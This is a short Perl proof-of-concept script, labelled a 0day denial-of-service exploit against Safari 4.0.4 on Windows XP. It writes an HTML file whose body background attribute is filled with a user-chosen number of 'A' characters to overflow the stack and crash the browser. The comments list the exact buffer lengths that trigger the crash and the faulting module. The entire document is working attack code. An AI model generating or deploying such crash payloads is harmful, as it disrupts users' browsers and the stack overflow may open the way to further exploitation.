#!/usr/bin/perl
#
# Safari 4.0.4 (531.21.10) - Stack Overflow/run
# 0Day DoS POC by John Cobb - www.NoBytes.com - 20/01/2010 - [v1.0]
# Tested on WinXP (32bit) SP3
#
# Magic Numbers:
# 114516 -&gt; 114718 : Safari quits without error
# 114719 : Safari quits with illegal operation:
# AppName: safari.exe
# AppVer: 5.31.21.10
# ModName: cfnetwork.dll
# ModVer: 1.450.5.0
# Offset: 000567a7
 
$filename = $ARGV[0];
$buffer = $ARGV[1];
if(!defined($filename))
{
print &quot;Usage: $0 &lt;filename.html&gt; &lt;buffer&gt;\n\n&quot;;
}
 
$header = &quot;&lt;html&gt;
&lt;head&gt;&quot; . &quot;\n&quot;;
$crash = &quot;&lt;body background = \&quot;&quot; . &quot;A&quot; x $buffer . &quot;\&quot;&gt;&quot; . &quot;\n&quot;;
$footer = &quot;&lt;/html&gt;&quot; . &quot;\n&quot;;
 
$data = $header . $crash . $footer;
 
open(FILE, &#039;&gt;&#039; . $filename);
print FILE $data;
close(FILE);
 
exit;
